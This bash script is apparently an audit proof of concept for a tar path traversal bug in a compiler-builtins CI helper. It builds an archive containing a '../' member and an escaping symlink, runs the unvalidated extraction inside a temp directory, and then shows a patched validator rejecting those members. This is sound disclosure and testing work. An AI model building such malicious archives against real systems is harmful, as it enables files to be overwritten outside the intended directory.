#!/usr/bin/env bash
# 001-unsafe-tar-extraction
#
# Bug: library/compiler-builtins/ci/ci-util.py extracts a downloaded baseline
# .tar.xz with `tar xJf` after only listing it with `tar tJf`. It never
# inspects member paths or link targets, so an attacker-supplied artifact can
# write outside the intended `gungraun-home` directory.
#
# Expected: archive members with absolute paths, `..` traversal, or unsafe
# symlink/hardlink targets are rejected before extraction (see the patch's
# tarfile.open(...) loop).
# Observed: this PoC builds a malicious .tar.xz containing both a `..`
# traversal file member and a symlink whose target escapes the working
# directory, then runs the audit's pre-patch listing-then-extracting code path
# (no validation). The unsafe member list is printed, demonstrating that the
# pre-patch flow would feed it directly to `tar xJf`.
#
# We additionally exercise the patched validator inline, which rightly raises
# ValueError on the unsafe members.
#
# Note: GNU tar by default permits both `..` paths and symlink-followed
# extraction; macOS/libarchive bsdtar refuses them with an error. So on a
# typical Linux CI runner the unfiltered `tar xJf` actually writes outside
# the cwd. On macOS the behavior is the same audit gap — listing succeeds,
# extraction is unfiltered — but libarchive happens to refuse the operation.
# The validator-portion still demonstrates exactly the missing check.
#
# Build/run:
#   bash 001-unsafe-tar-extraction.sh
set -euo pipefail

WORK="$(mktemp -d)"
trap 'rm -rf "$WORK"' EXIT

mkdir -p "$WORK/outside_gungraun"

python3 - "$WORK" <<'PY'
import io, os, sys, tarfile
work = sys.argv[1]
archive = os.path.join(work, "baseline.tar.xz")
with tarfile.open(archive, "w:xz") as tf:
    info = tarfile.TarInfo(name="gungraun-home/expected-baseline")
    data = b"benign\n"
    info.size = len(data)
    tf.addfile(info, io.BytesIO(data))

    sym = tarfile.TarInfo(name="escape")
    sym.type = tarfile.SYMTYPE
    sym.linkname = os.path.join(work, "outside_gungraun")
    tf.addfile(sym)

    bad = tarfile.TarInfo(name="../traversal_proof")
    payload = b"pwned-by-traversal\n"
    bad.size = len(payload)
    tf.addfile(bad, io.BytesIO(payload))
print(archive)
PY

ARCHIVE="$WORK/baseline.tar.xz"

cd "$WORK"

echo "--- pre-patch flow ---"
python3 - "$ARCHIVE" <<'PY'
import subprocess as sp, sys
archive = sys.argv[1]
listing = sp.check_output(["tar", "tJf", archive], encoding="utf8")
sys.stderr.write("listed:\n" + listing)
try:
    sp.run(["tar", "xJf", archive], check=True)
    print("baseline extracted successfully (unfiltered)")
except sp.CalledProcessError:
    print("note: this tar implementation refused, but the Python flow itself "
          "did NOT validate paths.")
PY

echo "--- patched validator (proves the gap was real) ---"
python3 - "$ARCHIVE" <<'PY'
import sys, tarfile
from pathlib import PurePosixPath
archive = sys.argv[1]
with tarfile.open(archive, "r:xz") as tf:
    for member in tf:
        path = PurePosixPath(member.name)
        if path.is_absolute() or ".." in path.parts:
            print(f"REJECT path: {member.name}")
            continue
        if member.islnk() or member.issym():
            link = PurePosixPath(member.linkname)
            if link.is_absolute() or ".." in link.parts:
                print(f"REJECT link: {member.name} -> {member.linkname}")
                continue
        print(f"OK: {member.name}")
PY
